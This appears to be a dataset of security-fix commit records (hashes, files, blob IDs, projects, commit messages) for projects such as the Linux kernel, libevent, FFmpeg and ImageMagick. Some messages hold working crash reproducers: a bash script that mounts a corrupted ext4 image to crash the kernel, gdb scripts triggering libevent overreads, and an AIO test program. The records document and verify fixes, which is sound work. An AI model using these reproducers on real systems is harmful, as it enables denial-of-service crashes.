Commit With Fix: 
    9d8fb070e782c95821c90d0ca7372fc6d7316c78
File(s) In Commit: 
    src/yaws_cgi.erl
Blob(s) In Commit: 
    42a29af6bcf46f8eb9d7697f92784142da137fa6
Blob(s) Before Fix: 
    6e628f705a28dfc339b809c7f17285c5d6a6f054
Projects:
    17204105_yaws
Commit Message for 9d8fb070e782c95821c90d0ca7372fc6d7316c78:
Security flaw http://httpoxy.org/ fixed A security flaw with HTTP_PROXY fixed. When we now construct the cgi env variables, we just skip the Proxy header. Reported by dominic@varspool.com

======================================================================
Commit With Fix: 
    423b4b719afd5ef4e6e19d8447fbf7b6bc0d0a25
File(s) In Commit: 
    hphp/runtime/server/fastcgi/fastcgi-transport.cpp
Blob(s) In Commit: 
    756e12e59e108b7b0595e70479e3cafc449ee641
Blob(s) Before Fix: 
    2cc9ebe81d1e0e7c2af60435a941d52b3a990659
    5b69d9190cb4ff81db269dd3dd43683b7b1f2eae
    b94327dbab74b43ae56186c0bb51512f071e0d6c
Projects:
    10000TB_hhvm
Commit Message for 423b4b719afd5ef4e6e19d8447fbf7b6bc0d0a25:
CVE-2016-1000109: Ignore Proxy HTTP header from fastcgi requests\n\nSummary: The default PHP behavior is to transform a Proxy header from requests into the HTTP_PROXY environment variable in the PHP environment running the request. Some scripts may use this env var to decide which HTTP proxy to connect to, and we don't want requests to have that kind of control over scripts' behavior.\n\nReviewed By: alexmalyshev, Orvid\n\nDifferential Revision: D3579221\n\nfbshipit-source-id: 18a405fd73aee65283aea99ff995f8082b3fc3b5

======================================================================
Commit With Fix: 
    c76fac666ea038753294f2ac94d310f8adece9ce
File(s) In Commit: 
    usr.bin/ssh/serverloop.c
Blob(s) In Commit: 
    3c413e5bb10fe98d0f0bede9913ec6f9f786affc
Blob(s) Before Fix: 
    2461702f6f4576ade84e1193f317b44f965f3a59
    679ad13c04475c88cdb80571301317b4c4fca337
Projects:
    Luigi30_src
Commit Message for c76fac666ea038753294f2ac94d310f8adece9ce:
disable Unix-domain socket forwarding when privsep is disabled

======================================================================
Commit With Fix: 
    ac8147a06ed2e2403fb6b9a0c03e618a9333c0e9
File(s) In Commit: 
    usr.bin/ssh/authfile.c
Blob(s) In Commit: 
    ec685544e7bc80db0e49e19fbeba91e1b496f912
Blob(s) Before Fix: 
    59771cb09f738f6bf32c878a576b631aaf43d3dc
Projects:
    Luigi30_src
Commit Message for ac8147a06ed2e2403fb6b9a0c03e618a9333c0e9:
use sshbuf_allocate() to pre-allocate the buffer used for loading keys. This avoids implicit realloc inside the buffer code, which might theoretically leave fragments of the key on the heap. This doesn't appear to happen in practice for normal sized keys, but was observed for novelty oversize ones.\n\nPointed out by Jann Horn of Project Zero  ok markus@

======================================================================
Commit With Fix: 
    22f6b4d34fcf039c63a94e7670e0da24f8575a5a
File(s) In Commit: 
    fs/aio.c
Blob(s) In Commit: 
    4fe81d1c60f962b53392a6b4b0d047f129509c87
Blob(s) Before Fix: 
    155f84253f331a4d9d13ffac3d1ea70322b09b11
    428484f2f8413dc6972da9857b3392264b9e6421
    733750096b71b38d23783926b4f85da9ac2d35ea
    a6deaa78326d5bd05adafc5b2bee373ca0757b83
    a793f7023755dc15cb2b8bebe5206bc610bb428c
    b1170a7affe2a163ac1fefa5f2e8576d7c3d1479
    dd8d6f234a0ba2b3dcc558ccd202d1e7cacdd7f8
    e68c06a4a01796862ea0cfa50b9c78c715489e4d
    fb8e45b88cd4ecf0aa4b3c485051d7f437ba7bd8
Projects:
    0-T-0_ps4-linux
Commit Message for 22f6b4d34fcf039c63a94e7670e0da24f8575a5a:
aio: mark AIO pseudo-fs noexec\n\nThis ensures that do_mmap() won't implicitly make AIO memory mappings executable if the READ_IMPLIES_EXEC personality flag is set.  Such behavior is problematic because the security_mmap_file LSM hook doesn't catch this case, potentially permitting an attacker to bypass a W^X policy enforced by SELinux.\n\nI have tested the patch on my machine.\n\nTo test the behavior, compile and run this:\n\n    #define _GNU_SOURCE     #include <unistd.h>     #include <sys/personality.h>     #include <linux/aio_abi.h>     #include <err.h>     #include <stdlib.h>     #include <stdio.h>     #include <sys/syscall.h>\n\n    int main(void) {         personality(READ_IMPLIES_EXEC)          aio_context_t ctx = 0          if (syscall(__NR_io_setup, 1, &ctx))             err(1, "io_setup") \n\n        char cmd[1000]          sprintf(cmd, "cat /proc/%d/maps | grep -F '/[aio]'",             (int)getpid())          system(cmd)          return 0      }\n\nIn the output, "rw-s" is good, "rwxs" is bad.\n\nSigned-off-by: Jann Horn <jann@thejh.net> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    933e96f01a8c889c7bf5ffd30020e86a02a046e7
File(s) In Commit: 
    MagickWand/magick-cli.c
Blob(s) In Commit: 
    c28dd71696cc89589b7199ff1fc336e7114e5fd7
Blob(s) Before Fix: 
    b4ad33bded56b31c5980ad335b1fe9e470cb0564
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 933e96f01a8c889c7bf5ffd30020e86a02a046e7:
https://github.com/ImageMagick/ImageMagick/issues/196

======================================================================
Commit With Fix: 
    4e914bbe371433f0590cefdf3bd5f3a5710069f9
File(s) In Commit: 
    coders/tiff.c
Blob(s) In Commit: 
    fa589d94f6eecaabc0c66fa62bfb0d0d0563716b
Blob(s) Before Fix: 
    d051e1e666555a57f3122797b2617730cbd47b73
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 4e914bbe371433f0590cefdf3bd5f3a5710069f9:
https://github.com/ImageMagick/ImageMagick/issues/196

======================================================================
Commit With Fix: 
    8a370f9ab120faf182aa160900ba692ba8e2bcf0
File(s) In Commit: 
    coders/mat.c
Blob(s) In Commit: 
    564e745ecda2a87bd7c738bc6a798cab78c15ca2
Blob(s) Before Fix: 
    28ab856d2a12240c1be4dc53b4d8437dbbe466cf
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 8a370f9ab120faf182aa160900ba692ba8e2bcf0:
Added check for invalid number of frames.

======================================================================
Commit With Fix: 
    7df3830c81716b959a2d0d3a0d8216b860ae0dc7
File(s) In Commit: 
    admin/plugin.php
Blob(s) In Commit: 
    16de979a52a159bb1a3d2e59794415b7c1624dab
Blob(s) Before Fix: 
    68e0c50d7a1bb13252767b2daee072d19bb759cc
Projects:
    7tonin_Piwigo
Commit Message for 7df3830c81716b959a2d0d3a0d8216b860ae0dc7:
fixes #575, sanitize user input before display on die()

======================================================================
Commit With Fix: 
    9dd92959f6975099e0c62163a846a4648a6a920f
File(s) In Commit: 
    admin/batch_manager.php
Blob(s) In Commit: 
    792cb1f5470238c27a2b1bf111da0b98c8b2c29c
Blob(s) Before Fix: 
    cbeb0ebe9b58653113d57e4f351ff3b4c604f924
Projects:
    7tonin_Piwigo
Commit Message for 9dd92959f6975099e0c62163a846a4648a6a920f:
fixes #572, check $_GET['mode'] against hacking attempt

======================================================================
Commit With Fix: 
    4b33a0fd199fd445b15a49927ea6a9a153e3877d
File(s) In Commit: 
    admin/languages.php
Blob(s) In Commit: 
    936e5b2537fee7489b2b9736f59696feed9225c0
Blob(s) Before Fix: 
    0ea4c17df8a1fe26a7f0a5b9218c51ea15bfb0c4
    c901d923c494c14dc1e85f4500b4fb9cc686287c
Projects:
    7tonin_Piwigo
Commit Message for 4b33a0fd199fd445b15a49927ea6a9a153e3877d:
fixes #573, check $_GET['tab'] against hacking attempt

======================================================================
Commit With Fix: 
    e986ea3dfa4a2957f71ae9bfaed406dd6e1ffff6
File(s) In Commit: 
    doc/lxc-attach.sgml.in
Blob(s) In Commit: 
    653ce1d9bd917ea22a9b29b8e40d0762f094e062
Blob(s) Before Fix: 
    8535c3df6d45c0c10c9971aeb1bd005640fb9a23
Projects:
    0x0916_lxc
Commit Message for e986ea3dfa4a2957f71ae9bfaed406dd6e1ffff6:
update lxc-attach manpage\n\n- explain rationale behind allocation of pty - briefly explain how a pty is allocated - add a short note that describes the changed behavior for lxc-attach when the   user is not placed in a writeable cgroup at login\n\nSigned-off-by: Christian Brauner <christian.brauner@mailbox.org>

======================================================================
Commit With Fix: 
    97566cf2806c0a5a86e884c96831a0c3b1ec6c20
File(s) In Commit: 
    coders/ipl.c
Blob(s) In Commit: 
    58c60ca5582773402f3b1404f7ce9ddcff32dc22
Blob(s) Before Fix: 
    002ee6fa67a2092fdee2ca5c2bea9d04167d68cc
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 97566cf2806c0a5a86e884c96831a0c3b1ec6c20:
...

======================================================================
Commit With Fix: 
    d23beebe7b1179fb75db1e85fbca3100e49593d9
File(s) In Commit: 
    coders/wpg.c
Blob(s) In Commit: 
    82c3b7e29e0b08d238b27321793bf5620884cfbb
Blob(s) Before Fix: 
    7cd9162931e9853b7a3e59b9c623a9f5a6dc9a93
Projects:
    2016repotsheyue_ImageMagick
Commit Message for d23beebe7b1179fb75db1e85fbca3100e49593d9:
...

======================================================================
Commit With Fix: 
    48a992727d82cb7db076fa15d372178743b1f4cd
File(s) In Commit: 
    crypto/mcryptd.c
Blob(s) In Commit: 
    c207458d62993350d9a0cfca5e1deca573b09c8c
Blob(s) Before Fix: 
    7406ed0745becd839ee00f6e1a94d82e88639406
    86fb59b109a996193eefde142abb89bc29e87258
    94ee44acd4656811c081549b849c295ef160bd12
    a0ceb41d5cccc17e7f0932eca3f2dbaa71905865
    a14100e747548a90d56abc3dc77ee85380dc551c
    a8e870444ea9cef0ab4a2c6c919724905c7dbde7
    c4eb9da49d4f55e856ea4199fd0442af77d9fd92
    c6e992082259250c454a771a291e4c66c3514cc5
    fe5b495a434d3c1d5efc2e5b211c7d3863078726
Projects:
    0-T-0_ps4-linux
Commit Message for 48a992727d82cb7db076fa15d372178743b1f4cd:
crypto: mcryptd - Check mcryptd algorithm compatibility\n\nAlgorithms not compatible with mcryptd could be spawned by mcryptd with a direct crypto_alloc_tfm invocation using a "mcryptd(alg)" name construct.  This causes mcryptd to crash the kernel if an arbitrary "alg" is incompatible and not intended to be used with mcryptd.  It is an issue if AF_ALG tries to spawn mcryptd(alg) to expose it externally. But such algorithms must be used internally and not be exposed.\n\nWe added a check to enforce that only internal algorithms are allowed with mcryptd at the time mcryptd is spawning an algorithm.\n\nLink: http://marc.info/?l=linux-crypto-vger&m=148063683310477&w=2 Cc: stable@vger.kernel.org Reported-by: Mikulas Patocka <mpatocka@redhat.com> Signed-off-by: Tim Chen <tim.c.chen@linux.intel.com> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>

======================================================================
Commit With Fix: 
    a0f1d21c1ccb1da66629627a74059dd7f5ac9c61
File(s) In Commit: 
    virt/kvm/kvm_main.c
Blob(s) In Commit: 
    7f9ee2929cfea3ba0d30740e5c82109c14d359e4
Blob(s) Before Fix: 
    032150ca597de3428bc1f46095e6cdcf7be88e4a
    195078225aa5d0c3b3214fd40e0b5f441c5d7518
    1b20768e781df38efca02085c1c205f08dc4ef16
    1cf9ccb010131d42c3a573079437d87502ac016f
    28510e72618a00fed5ef83d0e588ef5e08dc5b84
    2907b7b7865455dea81a236a56c411ef1d7d44ac
    37af23052470eff99b2c3a3fdcf05898c7312602
    484079efea5b89d7d8533804255a0ababe6ad0af
    48bd520fc702c9e0aa812df6b93d564872f42848
    4fd482fb9260b89feda9736854861719b50c974f
    56baae8c2f56baf0f41bb7bb24b0b12679267d20
    5c360347a1e9fc2091f5abf0bbb6a3432e13add9
    690d15eaee05fad75ab40e91fd9b4155c7176a5d
    7287bf5d1c9edc1fa84681aea4f989c9c750fa9c
    7338e30421d84101313535a5cdc51a23678682ac
    7ba1d10ffed2d5a416701153caea619c7ab22f8d
    81dfc73d3df39851e3b44cd546f5f66046ec5e0f
    85422985235f2c8fa75e7842d2117d772f6dccf5
    a0f02bc7b2646e2c0f8b9ba84c1b80a1a0f57169
    cc081ccfcaa3743ca5e0f46dd350bda36bc3ec72
    cc6a25d95fbff532bf5b00b0c339bec91ddc5bcf
    ce3d8e5be73e38f54d4b2fab2bdb9874abaccf0d
    d617f69131d7667d3847c7e0fc040a717625bf38
    dd4ac9d9e8f5c71abd930e1ed079b4c52834cd51
    f4c6d4f6d2e89d874816218a790429e57cc7fb04
Projects:
    0-T-0_ps4-linux
Commit Message for a0f1d21c1ccb1da66629627a74059dd7f5ac9c61:
KVM: use after free in kvm_ioctl_create_device()\n\nWe should move the ops->destroy(dev) after the list_del(&dev->vm_node) so that we don't use "dev" after freeing it.\n\nFixes: a28ebea2adc4 ("KVM: Protect device ops->create and list_add with kvm->lock") Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Reviewed-by: David Hildenbrand <david@redhat.com> Signed-off-by: Radim Krčmář <rkrcmar@redhat.com>

======================================================================
Commit With Fix: 
    06deeec77a5a689cc94b21a8a91a76e42176685d
File(s) In Commit: 
    fs/cifs/smbencrypt.c
Blob(s) In Commit: 
    c12bffefa3c9b59b2290ecdb243ae308b08e7224
Blob(s) Before Fix: 
    2b6d87bfdf8e8f7de3b3657a28137c4496f7b37f
    43eb1367b10353ae1e71a5196b83587df6939160
    699b7868108f658a3262943c7763b13d59767a89
    6c1566366a6613cbc494fe46344c8fd00342a82b
    80d850881938d0c0950addc4d97ae4855dadfa4a
    a0a58fbe2c10586069f5ba9c07d7d53ca05dcd90
    a0b80ac651a60a385738ff5dff8b9cfa01de2ce4
    a4232ec4f2ba45386b4f25db484f7f30135b01c2
    c6dfc2277cbb7ddebeb1e9aaa1c81249b29372ca
    d5cd9aa7eacc1cc8f0413b401ae69cf7b959d690
Projects:
    0-T-0_ps4-linux
Commit Message for 06deeec77a5a689cc94b21a8a91a76e42176685d:
cifs: Fix smbencrypt() to stop pointing a scatterlist at the stack\n\nsmbencrypt() points a scatterlist to the stack, which is breaks if CONFIG_VMAP_STACK=y.\n\nFix it by switching to crypto_cipher_encrypt_one().  The new code should be considerably faster as an added benefit.\n\nThis code is nearly identical to some code that Eric Biggers suggested.\n\nCc: stable@vger.kernel.org # 4.9 only Reported-by: Eric Biggers <ebiggers3@gmail.com> Signed-off-by: Andy Lutomirski <luto@kernel.org> Acked-by: Jeff Layton <jlayton@redhat.com> Signed-off-by: Steve French <smfrench@gmail.com>

======================================================================
Commit With Fix: 
    5ca71a7bc18b6897ab21d815d15e218e204581e2
File(s) In Commit: 
    src/cmstypes.c
Blob(s) In Commit: 
    c7328b9999826069e919f57bed4fef69210e5173
Blob(s) Before Fix: 
    cb618600a9a940960983313b686101c1204f100d
Projects:
    13-Graphics_Little-CMS
Commit Message for 5ca71a7bc18b6897ab21d815d15e218e204581e2:
Added an extra check to MLU bounds\n\nThanks to Ibrahim el-sayed for spotting the bug

======================================================================
Commit With Fix: 
    60bfb401ad5a4a8ae995dcd36372fe15c71e1a35
File(s) In Commit: 
    src/gd_interpolation.c
Blob(s) In Commit: 
    b9a206551dc5366a2eb4b53d22b429c9893b5236
Blob(s) Before Fix: 
    7e7943d69554ff461134a6f1a7691dc117652ccc
    bebecf2157b492eec12d053081dfc8b30ea68688
    e83f0bbb3d4f2c47e2d86b23dd16f939e3a0fcfb
    f00c946228652e922057d5e94b714754ef43b4ff
Projects:
    86salo_libgd
Commit Message for 60bfb401ad5a4a8ae995dcd36372fe15c71e1a35:
Fix potential unsigned underflow\n\nNo need to decrease `u`, so we don't do it. While we're at it, we also factor out the overflow check of the loop, what improves performance and readability.\n\nThis issue has been reported by Stefan Esser to security@libgd.org.

======================================================================
Commit With Fix: 
    701ab8129ba9ea64f569daedca9a8603abad740f
File(s) In Commit: 
    protocols/bee_ft.c
Blob(s) In Commit: 
    916b2e88cfffcc71563c1d46f8bfb3c35d945255
Blob(s) Before Fix: 
    27fd4eacd4469fc7007b7e902193da8972e11a2a
Projects:
    AaronVanGeffen_bitlbee
Commit Message for 701ab8129ba9ea64f569daedca9a8603abad740f:
imcb_file_send_start: handle ft attempts from non-existing users

======================================================================
Commit With Fix: 
    2a05c8f813de6f2278827734bf8102291e7484aa
File(s) In Commit: 
    libavformat/http.c
Blob(s) In Commit: 
    13f3be42271095425a837deaf75ab522572b4a28
Blob(s) Before Fix: 
    d48958d8a3ce04c58d7f5458851b12696ea32f9e
Projects:
    00ERNEST00_FFmpeg
Commit Message for 2a05c8f813de6f2278827734bf8102291e7484aa:
http: make length/offset-related variables unsigned.\n\nFixes #5992, reported and found by Paul Cher <paulcher@icloud.com>.

======================================================================
Commit With Fix: 
    7d57ca4d9a75562fa32e40766211de150f8b3ee7
File(s) In Commit: 
    libavformat/rtmppkt.c
Blob(s) In Commit: 
    cde0da78ce144b23a74944e17080b5fca86587ec
Blob(s) Before Fix: 
    0d693c27f7f8f6dd526cf7034e1e805e3f54b577
    375ae2fcb139d226a04ca5995e4c5650e5c90e80
    3ae605d28049bc88abbc15a8a9c475bfe37a04d2
    3bd28eb61475400335d6914a99fb3155e58daa1f
    65d5dd9d5704b625cfc24e7213bd229c95588c46
    833a3dbadebede9f6d4f5eb2bd627f359881dc5b
    92172dc366012479f86496609e9bfcaa7eaff6a1
    c474fb3d5885c2b6c69c339ee2aa30ece3925ebc
    ca7838868e065ef6d0fe3e86e57ccc5230d92a84
    cbd09f23be03e45c7818966f7b5ae38df15aee5d
    f8c51d01fade3f25e84dacc8fe1ebc21e76453fc
    f99540cd5103b8765f8afe3522038dd5b73c8d1f
Projects:
    00ERNEST00_FFmpeg
Commit Message for 7d57ca4d9a75562fa32e40766211de150f8b3ee7:
avformat/rtmppkt: Check for packet size mismatches\n\nFixes out of array access\n\nFound-by: Paul Cher <paulcher@icloud.com> Reviewed-by: Paul Cher <paulcher@icloud.com> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    a5d25faa3f4b18dac737fdb35d0dd68eb0dc2156
File(s) In Commit: 
    ffserver.c
Blob(s) In Commit: 
    02a583464b3784b19139c711943372cb2f295cef
Blob(s) Before Fix: 
    19c3ceda1a0a4620caf51461f0e78705a8528a9b
    1a2758367736bb39d31a187fbbfbded91d88f0a5
    3ff761f68f4532b3add9461a2210e07754965d15
    453d790e6cda57b463a0fda79eaf508e218ba63d
    48d880831fb32bf391851d7793541a0fe7b9a1df
    bc7dbee760801105aad54bc4469a8075bbf57a92
Projects:
    00ERNEST00_FFmpeg
Commit Message for a5d25faa3f4b18dac737fdb35d0dd68eb0dc2156:
ffserver: Check chunk size\n\nFixes out of array access\n\nFixes: poc_ffserver.py Found-by: Paul Cher <paulcher@icloud.com> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    96f64a022014a208105ead6c8a7066018449d86d
File(s) In Commit: 
    evdns.c
Blob(s) In Commit: 
    c4112330a9c532982511cfe6edee2ff1624a12c3
Blob(s) Before Fix: 
    0955a28984045aec29d399ce19def7a71154c2d7
    60f4db5c5fba1b0fc1b0e5849f1d473ae1c4dc50
Projects:
    10corp_libevent-1
Commit Message for 96f64a022014a208105ead6c8a7066018449d86d:
evdns: name_parse(): fix remote stack overread\n\n@asn-the-goblin-slayer:   "the name_parse() function in libevent's DNS code is vulnerable to a buffer overread.\n\n   971         if (cp != name_out) {    972             if (cp + 1 >= end) return -1     973             *cp++ = '.'     974         }    975         if (cp + label_len >= end) return -1     976         memcpy(cp, packet + j, label_len)     977         cp += label_len     978         j += label_len     No check is made against length before the memcpy occurs.\n\n   This was found through the Tor bug bounty program and the discovery should be credited to 'Guido Vranken'."\n\nReproducer for gdb (https://gist.github.com/azat/e4fcf540e9b89ab86d02):   set $PROT_NONE=0x0   set $PROT_READ=0x1   set $PROT_WRITE=0x2   set $MAP_ANONYMOUS=0x20   set $MAP_SHARED=0x01   set $MAP_FIXED=0x10   set $MAP_32BIT=0x40\n\n  start\n\n  set $length=202   # overread   set $length=2   # allocate with mmap to have a seg fault on page boundary   set $l=(1<<20)*2   p mmap(0, $l, $PROT_READ|$PROT_WRITE, $MAP_ANONYMOUS|$MAP_SHARED|$MAP_32BIT, -1, 0)   set $packet=(char *)$1+$l-$length   # hack the packet   set $packet[0]=63   set $packet[1]='/'\n\n  p malloc(sizeof(int))   set $idx=(int *)$2   set $idx[0]=0   set $name_out_len=202\n\n  p malloc($name_out_len)   set $name_out=$3\n\n  # have WRITE only mapping to fail on read   set $end=$1+$l   p (void *)mmap($end, 1<<12, $PROT_NONE, $MAP_ANONYMOUS|$MAP_SHARED|$MAP_FIXED|$MAP_32BIT, -1, 0)   set $m=$4\n\n  p name_parse($packet, $length, $idx, $name_out, $name_out_len)   x/2s (char *)$name_out\n\nBefore this patch: $ gdb -ex 'source gdb' dns-example $1 = 1073741824 $2 = (void *) 0x633010 $3 = (void *) 0x633030 $4 = (void *) 0x40200000\n\nProgram received signal SIGSEGV, Segmentation fault. __memcpy_sse2_unaligned () at memcpy-sse2-unaligned.S:33\n\nAfter this patch: $ gdb -ex 'source gdb' dns-example $1 = 1073741824 $2 = (void *) 0x633010 $3 = (void *) 0x633030 $4 = (void *) 0x40200000 $5 = -1 0x633030:       "/" 0x633032:       "" (gdb) p $m $6 = (void *) 0x40200000 (gdb) p $1 $7 = 1073741824 (gdb) p/x $1 $8 = 0x40000000 (gdb) quit\n\nP.S. plus drop one condition duplicate.\n\nFixes: #317

======================================================================
Commit With Fix: 
    329acc18a0768c21ba22522f01a5c7f46cacc4d5
File(s) In Commit: 
    evutil.c
Blob(s) In Commit: 
    495bfcc029e4b397c5ea4581ec9d0aaad2f08bce
Blob(s) Before Fix: 
    3d72e4032450d89498ad84467aaa8df4ec848abc
    79d825d94a3e55366e1ae5f3adb11d21ffea87ce
Projects:
    10corp_libevent-1
Commit Message for 329acc18a0768c21ba22522f01a5c7f46cacc4d5:
evutil_parse_sockaddr_port(): fix buffer overflow\n\n@asn-the-goblin-slayer:   "Length between '[' and ']' is cast to signed 32 bit integer on line 1815. Is    the length is more than 2<<31 (INT_MAX), len will hold a negative value.    Consequently, it will pass the check at line 1816. Segfault happens at line    1819.\n\n   Generate a resolv.conf with generate-resolv.conf, then compile and run    poc.c. See entry-functions.txt for functions in tor that might be    vulnerable.\n\n   Please credit 'Guido Vranken' for this discovery through the Tor bug bounty    program."\n\nReproducer for gdb (https://gist.github.com/azat/be2b0d5e9417ba0dfe2c):   start   p (1ULL<<31)+1ULL   # $1 = 2147483649   p malloc(sizeof(struct sockaddr))   # $2 = (void *) 0x646010   p malloc(sizeof(int))   # $3 = (void *) 0x646030   p malloc($1)   # $4 = (void *) 0x7fff76a2a010   p memset($4, 1, $1)   # $5 = 1990369296   p (char *)$4   # $6 = 0x7fff76a2a010 '\001' <repeats 200 times>...   set $6[0]='['   set $6[$1]=']'   p evutil_parse_sockaddr_port($4, $2, $3)   # $7 = -1\n\nBefore:   $ gdb bin/http-connect < gdb   (gdb) $1 = 2147483649   (gdb) (gdb) $2 = (void *) 0x646010   (gdb) (gdb) $3 = (void *) 0x646030   (gdb) (gdb) $4 = (void *) 0x7fff76a2a010   (gdb) (gdb) $5 = 1990369296   (gdb) (gdb) $6 = 0x7fff76a2a010 '\001' <repeats 200 times>...   (gdb) (gdb) (gdb) (gdb)   Program received signal SIGSEGV, Segmentation fault.   __memcpy_sse2_unaligned () at memcpy-sse2-unaligned.S:36\n\nAfter:   $ gdb bin/http-connect < gdb   (gdb) $1 = 2147483649   (gdb) (gdb) $2 = (void *) 0x646010   (gdb) (gdb) $3 = (void *) 0x646030   (gdb) (gdb) $4 = (void *) 0x7fff76a2a010   (gdb) (gdb) $5 = 1990369296   (gdb) (gdb) $6 = 0x7fff76a2a010 '\001' <repeats 200 times>...   (gdb) (gdb) (gdb) (gdb) $7 = -1   (gdb) (gdb) quit\n\nFixes: #318

======================================================================
Commit With Fix: 
    ec65c42052d95d2c23d1d837136d1cf1d9ecef9e
File(s) In Commit: 
    evdns.c
Blob(s) In Commit: 
    e9dbc35c60662ccda395d21d95997193840b4b57
Blob(s) Before Fix: 
    02f5dff53056cddf88f49da003e57fb780f62a0b
    07ba206fa1360eb0c4db69ced5d6828ec36daa12
    0955a28984045aec29d399ce19def7a71154c2d7
    096eefb1fa1aa406174c0d1e7bb29839203f99b9
    400429257f527f11c0e0cec657eb404e4dfe6f77
    416137ba25b987167a285a625bea1f117debefd7
    60b104851167b1b73ffc6d8017c0700920e30efd
    6191c677f9bbdd42ebef9585e3bfe599d62555ba
    66a3bff3b8b3fb0f38d662db85384b0f91a06b6c
    905ff6b5141b81aae5cfd215154e8ea31930ff02
    9e5a0f2b77690af0f9da85ed6a2dde27fc17544c
    c4112330a9c532982511cfe6edee2ff1624a12c3
    e13357f1596a1f42d7401c3526fbb1516046774a
    e9cea45b52720535633c2577fcf2453cb5784630
    f42aa6098ba6ea3d0fdeea01638da2f1536fe484
Projects:
    10corp_libevent-1
Commit Message for ec65c42052d95d2c23d1d837136d1cf1d9ecef9e:
evdns: fix searching empty hostnames\n\nFrom #332:   Here follows a bug report by **Guido Vranken** via the _Tor bug bounty program_. Please credit Guido accordingly.\n\n  ## Bug report\n\n  The DNS code of Libevent contains this rather obvious OOB read:\n\n  ```c   static char *   search_make_new(const struct search_state *const state, int n, const char *const base_name) {       const size_t base_len = strlen(base_name)        const char need_to_append_dot = base_name[base_len - 1] == '.' ? 0 : 1    ```\n\n  If the length of ```base_name``` is 0, then line 3125 reads 1 byte before the buffer. This will trigger a crash on ASAN-protected builds.\n\n  To reproduce:\n\n  Build libevent with ASAN:   ```   $ CFLAGS='-fomit-frame-pointer -fsanitize=address' ./configure && make -j4   ```   Put the attached ```resolv.conf``` and ```poc.c``` in the source directory and then do:\n\n  ```   $ gcc -fsanitize=address -fomit-frame-pointer poc.c .libs/libevent.a   $ ./a.out   =================================================================   ==22201== ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60060000efdf at pc 0x4429da bp 0x7ffe1ed47300 sp 0x7ffe1ed472f8   READ of size 1 at 0x60060000efdf thread T0   ```\n\nP.S. we can add a check earlier, but since this is very uncommon, I didn't add it.\n\nFixes: #332

======================================================================
Commit With Fix: 
    3a4b77cd47bb837b8557595ec7425f281f2ca1fe
File(s) In Commit: 
    fs/ext4/super.c
Blob(s) In Commit: 
    32c0debbaa923aa22da752047f8c05c184a3bcf9
Blob(s) Before Fix: 
    a526956e49e789ba8187944f339311fe2b30aaab
Projects:
    0-T-0_ps4-linux
Commit Message for 3a4b77cd47bb837b8557595ec7425f281f2ca1fe:
ext4: validate s_first_meta_bg at mount time\n\nRalf Spenneberg reported that he hit a kernel crash when mounting a modified ext4 image. And it turns out that kernel crashed when calculating fs overhead (ext4_calculate_overhead()), this is because the image has very large s_first_meta_bg (debug code shows it's 842150400), and ext4 overruns the memory in count_overhead() when setting bitmap buffer, which is PAGE_SIZE.\n\next4_calculate_overhead():   buf = get_zeroed_page(GFP_NOFS)   <=== PAGE_SIZE buffer   blks = count_overhead(sb, i, buf) \n\ncount_overhead():   for (j = ext4_bg_num_gdb(sb, grp)  j > 0  j--) { <=== j = 842150400           ext4_set_bit(EXT4_B2C(sbi, s++), buf)    <=== buffer overrun           count++    }\n\nThis can be reproduced easily for me by this script:\n\n  #!/bin/bash   rm -f fs.img   mkdir -p /mnt/ext4   fallocate -l 16M fs.img   mke2fs -t ext4 -O bigalloc,meta_bg,^resize_inode -F fs.img   debugfs -w -R "ssv first_meta_bg 842150400" fs.img   mount -o loop fs.img /mnt/ext4\n\nFix it by validating s_first_meta_bg first at mount time, and refusing to mount if its value exceeds the largest possible meta_bg number.\n\nReported-by: Ralf Spenneberg <ralf@os-t.de> Signed-off-by: Eryu Guan <guaneryu@gmail.com> Signed-off-by: Theodore Ts'o <tytso@mit.edu> Reviewed-by: Andreas Dilger <adilger@dilger.ca>

======================================================================
Commit With Fix: 
    59ebef5978f80e2fdc7b4db4a28b668c5a39fbc3
File(s) In Commit: 
    core/admin/ajax/dashboard/check-module-integrity.php
Blob(s) In Commit: 
    cf29b95f757c50c0564a39259b425416cd97aea1
Blob(s) Before Fix: 
    637856f89071046161571ac4bc45c33e3c155309
Projects:
    4v4t4r_BigTree-CMS
Commit Message for 59ebef5978f80e2fdc7b4db4a28b668c5a39fbc3:
Fixing potential XSS attack vector. Thanks to Haojun Hou in ADLab of Venustech.

======================================================================
Commit With Fix: 
    bdfe95a6e81ffb4b2fad31a76b57943695beed20
File(s) In Commit: 
    src/libjasper/jp2/jp2_cod.c
Blob(s) In Commit: 
    7f3608ab8de79f357605dbfe6bb3ce18fa8c3c4c
Blob(s) Before Fix: 
    2f14234f7ba5016fc84f533bc8c7ae5e7d3c74a0
Projects:
    did-g_jasper
Commit Message for bdfe95a6e81ffb4b2fad31a76b57943695beed20:
Fixed another problem with incorrect cleanup of JP2 box data upon error.

======================================================================
Commit With Fix: 
    163ae1c6ad6299b19e22b4a35d5ab24a89791a98
File(s) In Commit: 
    fs/crypto/policy.c
Blob(s) In Commit: 
    c9800b1a2e930f65e8fa7a9b052fb80efeba512c
Blob(s) Before Fix: 
    0f9961eede1e74021c43c4943b2bb419ed09a198
Projects:
    0-T-0_ps4-linux
Commit Message for 163ae1c6ad6299b19e22b4a35d5ab24a89791a98:
fscrypto: add authorization check for setting encryption policy\n\nOn an ext4 or f2fs filesystem with file encryption supported, a user could set an encryption policy on any empty directory(*) to which they had readonly access.  This is obviously problematic, since such a directory might be owned by another user and the new encryption policy would prevent that other user from creating files in their own directory (for example).\n\nFix this by requiring inode_owner_or_capable() permission to set an encryption policy.  This means that either the caller must own the file, or the caller must have the capability CAP_FOWNER.\n\n(*) Or also on any regular file, for f2fs v4.6 and later and ext4     v4.8-rc1 and later  a separate bug fix is coming for that.\n\nSigned-off-by: Eric Biggers <ebiggers@google.com> Cc: stable@vger.kernel.org # 4.1+  check fs/{ext4,f2fs} Signed-off-by: Theodore Ts'o <tytso@mit.edu>

======================================================================
Commit With Fix: 
